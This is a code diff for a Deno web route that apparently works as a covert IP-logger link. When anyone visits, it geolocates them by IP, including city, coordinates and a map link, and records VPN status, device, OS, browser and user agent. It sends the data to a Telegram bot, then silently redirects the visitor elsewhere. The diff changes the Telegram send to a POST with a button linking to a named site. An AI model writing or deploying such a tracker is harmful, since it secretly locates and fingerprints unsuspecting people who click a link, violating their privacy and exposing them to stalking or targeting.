@@ -13,6 +13,7 @@ router.get("/", async (ctx) => {
   
   const ip = ctx.request.ip;
   const info = await ipapi(`${ip}`);
+  const bot = `https://api.telegram.org/bot${Deno.env.get("TOKEN")}/sendMessage`
   const countryinfo = encodeURIComponent(`**COUNTRY** : \`${info.country}\` `) + await getEmojiByName(`flag-${info.countryCode}`.toLowerCase());
   const cityInfo = encodeURIComponent(`**CITY** : \[${info.city}\]\(https://www.google.com/maps/search/?api=1&query=${info.lat}%2C${info.lon}\)`);
   const iptext = encodeURIComponent(`**IP** : \[${ip}\]\(https://ip2location.io/${ip}\)`);
@@ -22,9 +23,27 @@ router.get("/", async (ctx) => {
   const browser_v = encodeURIComponent(`**BROWSER** : ${browser.name}`);
   const userAgentString_v = encodeURIComponent(`**userAgentString** : \`\`\`ts ${userAgentString}\`\`\``);
   const text = `${iptext}%0A***-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-***%0A${vpn}%0A***-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-***%0A${countryinfo}%0A***-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-***%0A${cityInfo}%0A***-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-***%0A${device_v}%0A***-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-***%0A${browser_v}%0A***-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-***%0A${device_os}%0A***-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-***%0A${userAgentString_v}&parse_mode=markdown`
-   await fetch(
-    `https://api.telegram.org/bot${Deno.env.get("TOKEN")}/sendMessage?chat_id=${Deno.env.get("ID")}&text=${text}`,
-   );
+  const button = {
+    method: 'POST',
+    headers: {
+      'Content-Type': 'application/json'
+    },
+    body: JSON.stringify({
+      chat_id: Deno.env.get("ID"),
+      text: text,
+      reply_markup: {
+        inline_keyboard: [
+          [
+            { text: "LaResistencia.co", url: "http://laresistencia.co" }
+          ]
+        ]
+      }
+    })
+  };
+   await fetch(bot, button);
+  
+//    `https://api.telegram.org/bot${Deno.env.get("TOKEN")}/sendMessage?chat_id=${Deno.env.get("ID")}&text=${text}`,
+   
 
   ctx.response.redirect(`${Deno.env.get("URL")}`);
 });
